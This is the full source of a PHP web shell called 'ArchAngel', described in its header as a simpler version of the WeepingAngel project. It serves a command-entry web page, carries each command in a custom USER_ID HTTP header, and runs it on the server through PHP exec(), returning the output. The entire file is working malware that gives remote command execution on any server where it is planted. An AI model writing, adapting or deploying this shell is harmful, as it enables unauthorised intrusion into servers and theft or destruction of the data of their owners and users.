<?php 
    /**
     * Name:        ArchAngel
     * Author:      Trisna Quebe
     * Description: 
     * 
     * Simple static webshell based on WeepingAngel project, but without encryption and obfuscation.
     */
?>
<?php if (strlen($_SERVER['HTTP_USER_ID']) === 0): // Display HTML code only when header is not set. ?>
<!DOCTYPE html>
<html>
<head>
    <title>ArchAngel WebShell</title>
</head>
<style>
    .commandFailed {
        padding: 10px;
        color: #ffffff;
        background: #e80909;
    }

    .commandNormal {
        padding: 10px;
    }
</style>
<body>
<pre> █████╗ ██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗██╗     
██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║     
███████║██████╔╝██║     ███████║███████║██╔██╗ ██║██║  ███╗█████╗  ██║     
██╔══██║██╔══██╗██║     ██╔══██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║     
██║  ██║██║  ██║╚██████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝
                                                                           
    </pre>
    Command: <input type="text" placeholder="" id="commandInput"></input>
    <button onClick="onCommand()">Submit</button>

    <div id="commandOutputs">
    </div>
</body>
<script>

    // Executes command on shell.
    function execCommand(command) {

        var code = 0;
        var result = "Failed to execute command!";


        const req = new XMLHttpRequest();
        req.open("POST", "", true);
        req.setRequestHeader("USER_ID", command);
        req.onreadystatechange = function() {
            if (this.readyState != 4) {
                // Finished request.
                return;
            }

            if (this.status == 200) {
                const {result, code} = JSON.parse(this.responseText);

                var prettyResult = "";
                for (r of result) {
                    prettyResult += r + "\r\n";
                }

                onResult(prettyResult, code, command);
            }
        }
        req.send();
        return {"code": code, "result": result};

    }

    function onResult(result, code, command) {

        // The output code defines the style classname for output.
        let className = "";
        switch(code) {
            case 2: {
                // Failed
                className = "commandFailed";
                break;
            }
            case 127: {
                // Command not found.
                className = "commandFailed";
                command = command + ": command not found!"
                break;
            }
            default: {
                className = "commandNormal";
                break; // Normal.
            }
        }

        // Create new output element.
        const element = document.createElement("pre");
        const node = document.createTextNode("$ " + command + "\r\n\r\n" + result);

        // Setting up the new element.
        element.appendChild(node); 
        element.classList.add(className);
        
        // Add result to output list.
        const outputs = document.getElementById("commandOutputs");
        outputs.appendChild(element); 
    }

    // Retrieves the command from user.
    function onCommand() {

        const cmdInput = document.getElementById("commandInput");
        const command = cmdInput.value;
        cmdInput.value = "";
        if (command.length === 0) {
            return;
        }

        execCommand(command);
    }

    document.getElementById("commandInput").addEventListener("keypress", (event) => {
        if (event.key == "Enter") {
            event.preventDefault();
            onCommand();
        }
    })

</script>
</html>
<?php endif; ?>

<?php
    if (isset($_POST)) {

        $command = $_SERVER['HTTP_USER_ID'];
        if (strlen($command) == 0) {
            die();
        }

        exec($command, $outputArr, $retVal);


        $results = (object)[
            'result' => $outputArr,
            'code' => $retVal
        ];
        echo json_encode($results);
    }
    die();
?>
